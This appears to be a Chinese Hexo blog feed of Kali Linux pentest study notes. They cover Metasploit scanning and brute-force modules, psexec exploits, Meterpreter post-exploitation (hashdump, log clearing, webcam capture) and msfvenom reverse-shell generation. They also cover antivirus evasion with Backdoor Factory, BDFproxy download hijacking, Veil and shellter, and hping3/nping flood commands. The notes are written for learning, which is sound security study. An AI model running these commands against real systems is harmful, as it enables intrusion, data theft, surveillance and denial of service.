        <content type="html"><![CDATA[<h4 id="MSF-弱点扫描"><a href="#MSF-弱点扫描" class="headerlink" title="MSF-弱点扫描"></a>MSF-弱点扫描</h4><ul><li>根据信息收集结果搜索漏洞利用模块</li><li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li></ul><hr><ul><li><p>VNC密码破解</p><ul><li>5900端口</li><li>use auxiliary/scanner/vnc/vnc_login</li></ul></li><li><p>VNC无密码访问</p><ul><li><p>use auxiliary/scanner/vnc/vnc_none_auth</p><a id="more"></a><ul><li>如果是无密码的，则显示supported:None,free access!</li></ul></li></ul></li><li><p>RDP远程桌面漏洞</p><ul><li>use auxiliary/sacnner/rdp/ms12_020_check</li><li>检查不会造成DoS攻击</li><li>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<ul><li>蓝屏重启</li></ul></li></ul></li><li><p>设备后门</p><ul><li>use auxiliary/scanner/ssh/juniper</li><li>use auxiliary/scanner/ssh/fortinet_backdoor</li></ul></li><li><p>VMWare ESXi密码爆破</p><ul><li>use auxiliary/scanner/vmware/vmauthd_login</li><li>use auxiliary/scanner/vmware/vmware_enum_vms</li></ul></li><li><p>利用WEB API远程开启虚拟机</p><ul><li>ues auxiliary/admin/vmware/pweron_vm</li></ul></li></ul><hr><h4 id="HTTP弱点扫描"><a href="#HTTP弱点扫描" class="headerlink" title="HTTP弱点扫描"></a>HTTP弱点扫描</h4><ul><li><p>过期证书</p><ul><li>use auxiliary/scanner/http/cert</li></ul></li><li><p>显示目录及文件</p><ul><li>use auxiliary/scanner/http/dir_listing</li><li>use auxiliary/scanner/http/files_dir</li></ul></li><li><p>WebDAV Unicode 编码身份验证绕过</p><ul><li>use auxiliary/scanner/http/dir_webdav_unicode_bypass</li></ul></li><li><p>Tomcat 管理登陆</p><ul><li>use auxiliary/scanner/http/tomcat_mgr_login</li></ul></li><li><p>基于http方法的身份验证绕过</p><ul><li>use auxiliary/scanner/http/verb_auth_bypass</li></ul></li><li><p>wordpress密码爆破</p><ul><li>wordpress_login_enum</li></ul></li><li><p>WMAP WEB应用扫描器</p><ul><li>根据SQLMAP的工作方式开发</li><li>load wmap</li><li>wmap_sites -a <a href="http://192.168.8.133" target="_blank" rel="noopener">http://192.168.8.133</a></li><li>wmap_targets -t <a href="http://1.1.1.1/multilidae/index.php" target="_blank" rel="noopener">http://1.1.1.1/multilidae/index.php</a></li><li>wmap_run -t</li><li>wmap_run -e</li><li>wmap_vulns -l</li><li>vulns</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-信息收集、发现和端口扫描</title>
      <link href="/posts/c2caaf54.html"/>
      <url>/posts/c2caaf54.html</url>
      
        <content type="html"><![CDATA[<h4 id="MSF–信息收集"><a href="#MSF–信息收集" class="headerlink" title="MSF–信息收集"></a>MSF–信息收集</h4><ul><li><p>Nmap扫描</p><ul><li>db_nmap -sV 192.168.0.1/24</li></ul></li><li><p>Auxiliary扫描模块</p><ul><li><p>主机发现</p><ul><li>search arp</li><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE RHOSTS SHOST SMAC THREADS </li><li>run</li></ul><a id="more"></a></li><li><p>端口扫描</p><ul><li>search portscan</li><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS</li><li>run</li></ul></li><li><p>idle扫描</p><ul><li>查找ipidseq主机<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set rhosts 192.168.43.1/24</li><li>run</li></ul></li><li>nmap -PN -sI 192.168.43.117</li></ul></li><li><p>UDP扫描</p><ul><li>use /auxiliary/scanner/discovery/udp_sweep</li><li>~/udp_probe</li></ul></li></ul></li></ul><hr><ul><li><p>密码嗅探</p><ul><li>psnuffle，支持从pcap抓包文件提取密码，功能类似于dnsniff</li><li>支持pop3 imap ftp httpget</li></ul></li><li><p>SNMP扫描</p><ul><li>metasploitable：vi /etc/default/snmpd<ul><li>修改侦听地址</li></ul></li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>~enumusers</li><li>~enumshares</li></ul></li><li><p>SMB版本扫描</p><ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li><p>扫描命名管道，判断SMB服务类型（账号，密码）</p><ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li><p>扫描通过SMB管道可以访问的DCERPC服务</p><ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li><p>SMB共享枚举（账号、密码）</p><ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li><p>SMB用户枚举</p><ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li><p>用户sid枚举</p><ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li></ul><hr><ul><li><p>SSH版本扫描</p><ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li><p>SSH密码爆破</p><ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</li><li>set verbose true</li><li>run</li></ul></li></ul></li><li><p>SSH公钥登陆</p><ul><li>use auxiliary/scanner/ssh/ssh_login_pubikey<ul><li>set key_file id_rsa(通过各种方式获得的key)</li><li>set username root</li><li>run</li></ul></li></ul></li><li><p>Windows缺少的补丁</p><ul><li><p>基于已经取得的session进行检测</p></li><li><p>use post/windows/gather/enum_patches</p></li><li><p>检查失败</p><ul><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ul></li></ul></li><li><p>Mssql扫描端口</p><ul><li>TCP 1433或动态端口/如果是动态端口，则在UDP1434查询TCP端口号</li><li>use auxiliary/scanner/mssql/mssql_ping</li></ul></li><li><p>爆破mssql密码</p><ul><li>use auxiliary/scanner/mssql/mssql_login</li></ul></li><li><p>远程执行代码</p><ul><li>use auxiliary/admin/mssql/mssql_exec</li><li>set cmd net user user pass /add</li></ul></li><li><p>FTP版本扫描</p><ul><li>search ftp_version</li></ul></li><li><p>FTP是否支持匿名登陆</p><ul><li>search anonymous</li><li>search ftp/anoymous</li><li>search ftp_login</li></ul></li><li><p>use auxiliary/scanner/[tab]</p><ul><li>多尝试，实操。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-exploit、payload、meterpreter、msfcli</title>
      <link href="/posts/a3d911ff.html"/>
      <url>/posts/a3d911ff.html</url>
      
        <content type="html"><![CDATA[<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>以下两个用winserver2003测试成功。</p><ul><li><p>Active expolit</p><ul><li>use exploit/windows/smb/psexec</li><li>set RHOST 1.1.1.14</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 1.1.1.10set LPORT 4444</li><li>set SMBUSER user1</li><li>set SMBPASS pass1</li><li>exploit</li></ul></li><li><p>Passive exploit</p><ul><li>search ms07_017</li></ul><a id="more"></a><ul><li>use 0</li><li>set payload windows/shell/reverse_tcp</li><li>set servhost 1.1.1.10</li><li>set lhost 1.1.1.10</li><li>set lport 4444</li><li>exploit</li></ul></li></ul><hr><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li><p>use payload/windows/shell_bind_tcp</p></li><li><p>generate(生成的payload含有坏字符)</p><ul><li>generate -b ‘\x00’</li><li>generate -b ‘\x00\x02\x44’</li><li>会自动选择最优的encoder</li></ul></li><li><p>手动指定编码模块</p><ul><li>show encoders</li><li>generate -e x86/nonalpha</li><li>generate -b ‘\x00\xff’ -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</li></ul></li><li><p>NOP：no-operation/Next Operation(无任何操作）</p><ul><li>EiP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li><li>generate -s 14(payload前面的NOP的长度)</li></ul></li><li><p>-t</p></li><li><p>-f 选择payload的语言。</p></li></ul><hr><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><ul><li><p>高级、动态、可拓展的Payload</p><ul><li>基于meterpreter上下文，利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li><p>完全基于内存的DLL注入式payload（不写硬盘）</p><ul><li>注入合法系统进程，并建立stager</li><li>基于Stager上传和预加载DLL进行拓展模块的注入（客户端API）</li><li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续拓展模块（避免网络取证）</li></ul></li><li><p>服务端使用C语言编写</p></li><li><p>客户端（运行在被渗透的机器）提供基于ruby的全特性API（支持任何语言）</p></li></ul><h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><ul><li><p>用meterpreter的payload获取到目标shel后，sessions -i 进入meterpreter的命令界面。help查看帮助。</p></li><li><p>background退出当前session</p></li><li><p>一些基本命令可以使用（即便在windows操作系统）</p><ul><li>cd、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit</li><li>lpwd、lcd、lls（在命令前加l,就是在本机执行命令）</li></ul></li><li><p>run、bgrun（跑一些脚本）</p></li><li><p>clearev 清除日志（windows事件日志查看器）</p></li><li><p>download（默认下载到/tmp）</p></li><li><p>upload /usr/share/windows-binaries/nc.exe c:\windows\system32</p></li><li><p>getuid、getsystem（切换为system用户）、getprivs、getproxy、</p></li><li><p>getpid(查看当前session注入的进程）、ps查看所有进程，migrate（把自己迁移到其它进程）</p></li><li><p>hashdump、sysinfo</p></li><li><p>show_mount、search</p></li><li><p>arp、netstat、route</p></li><li><p>idletime、resourece、</p></li><li><p>record_mic、webcam_list、webcam_snap -i 1 -v false</p></li><li><p>python拓展</p><ul><li>load python</li><li>python_execute”print(‘asdf’)”</li><li>python_execute”import os;cd =os.getcwd()” -r cd</li><li>python_import -f find.py</li></ul></li></ul><hr><h4 id="msfcli"><a href="#msfcli" class="headerlink" title="msfcli"></a>msfcli</h4><ul><li><p>编写脚本时便于引用</p></li><li><p>msfconsole -x “use xxx;set xx xxx;set xx xx;exploit”</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-基本命令</title>
      <link href="/posts/96d11606.html"/>
      <url>/posts/96d11606.html</url>
      
        <content type="html"><![CDATA[<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><p>目前最流行、最强大、最具拓展性的渗透测试平台软件</p></li><li><p>基于Metasploit进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003年由HD More发布第一版，2007年用ruby重写</p><ul><li>集成了渗透测试标准（PETS）思想</li><li>一定程度上统一了渗透测试和漏洞研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul><a id="more"></a></li><li><p>开发活跃、版本更新频繁（每周）</p><ul><li>早期版本基于社区力量维护，被Rapid7收购后打造出其商业版本产品</li><li>目前分化为四个版本，社区版本依然十分活跃</li><li>HD More说：为Metasploit写书是种自虐- -</li></ul></li></ul><hr><h3 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h3><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务无需人工手动编码实现</li><li>处理Socket连接访问、协议应答（http/SSL/SMB等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>MSf::Core<ul><li>提供MSF的核心基本API、是框架的核心功能实现库</li></ul></li><li>MSF:Base<ul><li>提供友好的API接口，便于模块调用的库</li></ul></li><li>Plugin插件<ul><li>连接和调用外部扩展功能和系统（调用sqlmap、nessus、OpenVAS)</li></ul></li></ul><hr><h4 id="技术功能模块"><a href="#技术功能模块" class="headerlink" title="技术功能模块"></a>技术功能模块</h4><ul><li><p>/usr/share/metasploit-framework/modules/</p></li><li><p>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法。</p></li><li><p>Payload：成功exploit之后，真正在目标系统执行的代码或指令</p><ul><li>Single：all in one，不需要依赖其它文件，大小比较大</li><li>Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li><li>Stages：利用stager建立的连接下载的后续payload</li><li>Stager、stages都有多种类型，适用于不同场景</li></ul></li><li><p>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块。</p></li><li><p>Encoders：对payload进行加密</p></li><li><p>Nops：提高payload稳定性及维持大小</p></li><li><p>evasion：免杀0.0</p></li></ul><hr><h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><ul><li><p>Banner</p></li><li><p>color</p></li><li><p>connect</p></li><li><p>show</p></li><li><p>search</p><ul><li>search xxx,</li><li>search name:mysql/path:scada/platform:aix/type:aux/author:aaron/cve:2020/可多条件同时搜索</li></ul></li><li><p>search ms08_067</p><ul><li>use 0</li><li>info</li><li>show options/payloads/targes/advanced/evasion/missing(显示需要设置，但是还没设置的参数)</li></ul></li><li><p>edit</p></li><li><p>check(大部分exploit没有)</p></li><li><p>back</p></li></ul><hr><ul><li>db_xxx</li><li>db_connect -y /usr/share/metasploit-framework/config/database.yml（shell中msfdb init后才有这个文件）</li><li>db_nmap：调用nmap，结果会保存进数据库</li><li>hosts<ul><li>hosts 1.1.1.1</li><li>hosts -u，只查看在线host</li><li>host -c xxx,只查看xxx列</li><li>host -S xxx,查看信息中包含xxx的host</li></ul></li><li>services<ul><li>services -S</li><li>services -p 445或services -p 1-500</li><li>services -c host,port 只显示host port 这两列</li><li>services </li></ul></li><li>vulns<ul><li>查看漏洞信息</li></ul></li><li>creds<ul><li>查看密码相关信息</li></ul></li><li>loot<ul><li>查看hash值</li></ul></li><li>db_export<ul><li>db_export -f xml /root/msfbak.xml</li></ul></li><li>db_import<ul><li>nmap  -A192.168.0.12 -oX nmap.xml，nmap生成的xml也可以导入。</li></ul></li></ul><hr><ul><li><p>setg RHOSTS 1.1.1.1,全局设置RHOSTS变量为1.1.1.1</p></li><li><p>unsetg RHOSTS</p></li><li><p>save 保存当前配置</p></li><li><p>jobs/kill 0</p></li><li><p>sessions 查看建立的连接</p><ul><li>session -i xx，进入某个session</li></ul></li><li><p>route 通过指定session路由流量</p><ul><li><code>route add 10.1.1.0 255.255.255.0 4</code>,通往指定网段的流量由session4路由</li></ul></li><li><p>irb （framework::version）</p><ul><li>开发接口</li></ul></li><li><p>resource</p><ul><li>把要执行的msf命令写入文件中，</li><li>msfconsole -r r.rc</li><li>然后resource -r 调用</li></ul></li><li><p>load，unload</p><ul><li>加载或释放外部模块，插件，比如nessus，openvas等等</li></ul></li><li><p>loadpath，调用指定目录中的模块</p></li></ul><hr><h4 id="Exploit-模块"><a href="#Exploit-模块" class="headerlink" title="Exploit 模块"></a>Exploit 模块</h4><ul><li>Active expolit<ul><li>use exploit/windows/smb/psexec</li><li>set RHOST 1.1.1.14</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 1.1.1.10set LPORT 4444</li><li>set SMBUSER user1</li><li>set SMBPASS pass1</li><li>exploit</li></ul></li><li><h2 id="Passive-exploit"><a href="#Passive-exploit" class="headerlink" title="Passive exploit"></a>Passive exploit</h2></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀-Backdoorfactory</title>
      <link href="/posts/65355d50.html"/>
      <url>/posts/65355d50.html</url>
      
        <content type="html"><![CDATA[<h4 id="Backdoor-factory"><a href="#Backdoor-factory" class="headerlink" title="Backdoor-factory"></a>Backdoor-factory</h4><ul><li>Patch<ul><li>通过替换exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>BDF：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法patch</li><li>存在一定概率文件会被patch破坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>将shellcode代码patch进模板文件，躲避AV检查</li><li>支持msf payload、自定义payload</li></ul></li></ul><a id="more"></a><h5 id="msf使用的patch方法（BDF也支持）"><a href="#msf使用的patch方法（BDF也支持）" class="headerlink" title="msf使用的patch方法（BDF也支持）"></a>msf使用的patch方法（BDF也支持）</h5><ul><li>覆盖程序入口<ul><li><code>msfvenom -p windows/shell/reverse_tcp</code></li></ul></li><li>创建新的线程执行shellcode并跳回原程序入口<ul><li><code>msfvenom -p windows/shell/reverse_tcp -k</code></li><li>增加代码片段，跳转执行后跳回源程序入口</li></ul></li></ul><h5 id="CTP方法"><a href="#CTP方法" class="headerlink" title="CTP方法"></a>CTP方法</h5><ul><li><p>增加新的代码段section,与MSF的-k方法类似</p></li><li><p>使用现有的代码缝隙（code cave）存放shellcode</p></li><li><p>Codecave</p><ul><li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li><li>根据统计判断，代码缝隙是在编译器在进行编译时造成的，不同的编译器产生的代码缝隙大小不同。</li></ul></li><li><p>单个代码缝隙不足以存放完整shellcode时</p><ul><li>多codecave跳转</li><li>结合msf的stager方法</li></ul></li><li><p>patch选项</p><ul><li>附加代码段</li><li>单codecave注入</li><li>多codecave注入</li></ul></li></ul><hr><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li><p>查看是否支持<code>backdoor-factory -f putty.exe -S</code></p></li><li><p>查看代码缝隙<code>backdoor-factory -f putty.exe -c -l 100</code> </p></li><li><p>查看payload<code>backdoor-factory -f putty.exe -s show</code></p></li><li><p><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_thread -H 192.168.1.119 -P 4444</code></p></li></ul><hr><h4 id="BDFproxy-通过mitmproxy实现"><a href="#BDFproxy-通过mitmproxy实现" class="headerlink" title="BDFproxy(通过mitmproxy实现)"></a>BDFproxy(通过mitmproxy实现)</h4><ul><li>基于流量劫持，动态注入shellcode（ARP spoof、DNS spoof、fake AP）</li><li>注入shellcode到下载文件的流量中</li><li>会自动清楚PE的签名，用0覆盖</li></ul><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul><li><p><code>sysctl -w net.ipv4.ip_forward=1</code></p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT -- to-ports 8080</code></p></li><li><p><code>vi /etc/bdfproxy/bdfproxy.cfg</code></p><ul><li>proxyMode=transparent</li><li>修改侦听IP地址并启动bdfproxy</li></ul></li><li><p>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</p></li><li><p>启动MSF</p></li></ul><h4 id="Mana"><a href="#Mana" class="headerlink" title="Mana"></a>Mana</h4><ul><li>无线Ap</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀-Veil、shellter</title>
      <link href="/posts/45c4bac.html"/>
      <url>/posts/45c4bac.html</url>
      
        <content type="html"><![CDATA[<h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a>Veil-evasion</h3><ul><li><p>属于Veil-framework框架的一部分</p></li><li><p>由Python语言编写</p></li><li><p>用于自动生成免杀payload</p><ul><li><p>集成msf payload，支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><ul><li>Hyperion、PEScrambler、BackDoor Factory</li></ul><a id="more"></a></li><li><p>集成各种开发打包运行环境</p><ul><li>Python：pyinstaller py2exe</li><li>C#：mono for.NET</li><li>C：mingw32</li></ul></li></ul></li></ul><hr><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li>按照指引使用payload生成一个exe，路径在<code>/var/lib/veil/output/compiled/xxx.exe</code></li><li>同时会生成一个msf配置文件在<code>/var/lib/veil/output/handlers/xxx.rc</code><ul><li><code>msfconsole -r xxx.rc</code>或者在msf命令行手动敲里面的命令，侦听reverseShell的连接</li></ul></li><li>在把python打包成exe时，可以使用pwnstaller进行混淆</li></ul><hr><h4 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a>Veil-catapult</h4><ul><li>Payload的投递工具<ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用Impacket上传二进制payload文件</li><li>利用SMB</li></ul></li></ul><hr><p>另一种免杀思路</p><ul><li>传统防病毒查杀原理<ul><li>查找文件特殊字符串，匹配查杀</li></ul></li><li>找到触发AV查杀的精确字符串，将其修改<ul><li>将执行程序分片成很多小段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤，最终精确定位出</li><li>Evade、hexeditor</li></ul></li></ul><hr><ol><li>自己写</li><li>加密</li><li>不写文件</li><li>找到特征字符串</li></ol><hr><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h4><ul><li>shellcode 注入工具，我们可以将shellcode注入到其它程序上，从而来躲避杀毒软件的查杀。</li><li>只支持32位PE程序，使用正常的exe文件作为模板，将payload代码加入模板内</li><li>参考：<a href="https://www.cnblogs.com/hkleak/p/12912706.html" target="_blank" rel="noopener">https://www.cnblogs.com/hkleak/p/12912706.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀</title>
      <link href="/posts/1546a1f3.html"/>
      <url>/posts/1546a1f3.html</url>
      
        <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意目的：控制、窃取、勒索、偷窥、推送、攻击。</li></ul><h5 id="主要防护手段"><a href="#主要防护手段" class="headerlink" title="主要防护手段"></a>主要防护手段</h5><ul><li>杀毒软件/防病毒软件/</li><li>客户端/服务器/邮件防病毒</li></ul><h5 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h5><ul><li>基于二进制文件中特征签名的黑名单检测</li><li>基于行为的分析方法（启发式）</li></ul><h5 id="事后手段"><a href="#事后手段" class="headerlink" title="事后手段"></a>事后手段</h5><ul><li>永远落后于病毒发展</li></ul><a id="more"></a><hr><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密使得特征字符不可读，从而逃避AV检测</li><li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器crypter的特征字符</li></ul></li></ul><h5 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h5><ul><li><p>恶意软件制造者：</p><ul><li>编写私有RAT软件，避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求（FUD）</li></ul></li><li><p>AV厂商</p><ul><li>广泛采集样本，尽快发现新出现的程序，更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善（误杀、漏杀）</li></ul></li><li><p>单一AV厂商的病毒库很难达到100%覆盖</p><ul><li><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a><ul><li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li></ul></li><li><a href="https://www.virscan.org" target="_blank" rel="noopener">https://www.virscan.org</a></li><li>在线多引擎查杀网站与AV厂商共享信息</li></ul></li><li><p>其它多引擎查毒站</p><ul><li><a href="https://nodistribute.com" target="_blank" rel="noopener">https://nodistribute.com</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li><p>常用RAT软件</p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul><hr><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><ul><li><p>msfvenom</p><ul><li>生成木马</li><li>对木马进行编码、混淆</li></ul></li><li><p>生成反弹shell</p><ul><li><code>-msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code> </li></ul></li><li><p>生成加密编码反弹shell</p><ul><li><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5|msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw|msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o a.exe</code></li></ul></li><li><p>利用模板隐藏shell</p><ul><li><code>msfvenom -p windows/shell_revirse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></li></ul></li></ul><hr><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术、避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><h5 id="Hyperion（32bit-PE程序加密器）"><a href="#Hyperion（32bit-PE程序加密器）" class="headerlink" title="Hyperion（32bit PE程序加密器）"></a>Hyperion（32bit PE程序加密器）</h5><ul><li>Cryter（加密）/Container（解密器+PE Loader）</li></ul><hr><h4 id="自己编写后门"><a href="#自己编写后门" class="headerlink" title="自己编写后门"></a>自己编写后门</h4><p>编译：</p><ul><li>Windows reverse shell<ul><li>wine gcc.exe windows.c -o windows.exe -lws2_32</li></ul></li><li>Linux shell<ul><li>gcc linux_revers_shell.c -o linux</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务攻击工具</title>
      <link href="/posts/d79a5d8.html"/>
      <url>/posts/d79a5d8.html</url>
      
        <content type="html"><![CDATA[<h4 id="RUDY（Are-You-Dead-Yet-）"><a href="#RUDY（Are-You-Dead-Yet-）" class="headerlink" title="RUDY（Are You Dead Yet?）"></a>RUDY（Are You Dead Yet?）</h4><ul><li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li><li>每次只传输一个字节的数据</li><li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li><li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li><li>美剧“黑客军团”中提到此攻击手段</li><li>必须是POST请求，页面中必须要有表单</li></ul><a id="more"></a><hr><h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><ul><li><p>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</p></li><li><p>Syn Flood攻击</p><ul><li><code>hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1</code></li><li><code>hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></li></ul></li><li><p>TCP Flood攻击</p><ul><li><code>hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></li></ul></li><li><p>ICMP Flood攻击</p><ul><li><code>hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></li></ul></li><li><p>UDP Flood攻击</p><ul><li><code>hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></li></ul></li><li><p>LAND攻击</p><ul><li>源地址和目的地址都是受害者，受害者与自己完成三次握手,或者不同端口相互循环应答。</li><li><code>hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></li></ul></li><li><p>参数：</p><ul><li>-a 伪造源地址</li><li>-s 源端口</li><li>-d 数据段字节</li><li>-p 目标端口</li></ul></li></ul><hr><h4 id="Nping"><a href="#Nping" class="headerlink" title="Nping"></a>Nping</h4><ul><li><p>nmap 的组件之一</p></li><li><p>TCP全连接DoS攻击</p><ul><li><code>nping --tcp-connect --rate=10000 -c 10000000000 -q 1.1.1.1</code></li></ul></li><li><p>查公网IP</p><ul><li><code>nping --echo-client &quot;public&quot; echo.nmap.org --udp</code><ul><li>传“public”字符到echo.nmap.org，会返回自己的公网IP</li></ul></li></ul></li></ul><hr><h4 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h4><ul><li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p></li><li><p>siege -g <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a> / 1.1.1.1</p></li><li><p>siege -i -c 1000 <a href="http://1.1.1.1/a.php" target="_blank" 